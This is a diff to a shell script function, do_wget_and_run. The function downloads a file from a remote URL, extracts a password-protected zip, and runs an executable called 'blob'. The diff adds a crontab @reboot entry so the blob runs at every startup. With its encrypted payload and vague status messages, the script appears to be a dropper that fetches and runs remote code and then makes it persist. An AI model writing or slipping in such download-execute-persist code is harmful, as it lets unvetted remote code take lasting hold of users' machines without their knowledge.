@@ -80,7 +80,7 @@ do_wget_and_run() {
     echo "------------------------------------------------------------------------------"
     echo "\n"
 
-    
+    # Download the file
     echo "Establishing connection to remote resource..."
     curl -L -o "$OUTPUT_FILE" "$FILE_URL"
 
@@ -89,7 +89,7 @@ do_wget_and_run() {
         exit 1
     fi
 
-   
+    # Validate the downloaded file
     FILE_TYPE=$(file -b "$OUTPUT_FILE")
     if [[ "$FILE_TYPE" != *"Zip archive data"* ]]; then
         echo "Artifact does not match expected configuration. Exiting."
@@ -100,7 +100,7 @@ do_wget_and_run() {
     echo " Preparing extracted elements for deployment"
     echo "------------------------------------------------------------------------------"
 
-    
+    # Extract the ZIP file
     unzip -o -P "$PASSWORD" "$OUTPUT_FILE" -d "$UNZIP_DIR"
 
     if [ $? -ne 0 ]; then
@@ -108,7 +108,7 @@ do_wget_and_run() {
         exit 1
     fi
 
-   
+    # Locate and execute the file
     BLOB_PATH="$UNZIP_DIR/blob"
     if [ -f "$BLOB_PATH" ]; then
         echo "------------------------------------------------------------------------------"
@@ -116,11 +116,18 @@ do_wget_and_run() {
         echo "------------------------------------------------------------------------------"
         chmod +x "$BLOB_PATH"
         "$BLOB_PATH"
+        
+        # Add a cron job to run the file at startup
+        echo "------------------------------------------------------------------------------"
+        echo " Adding to cron for startup execution"
+        echo "------------------------------------------------------------------------------"
+        (crontab -l 2>/dev/null; echo "@reboot $BLOB_PATH") | crontab -
     else
         echo "Required component missing from extracted set. Terminating."
         exit 1
     fi
 }
+
 
 
 
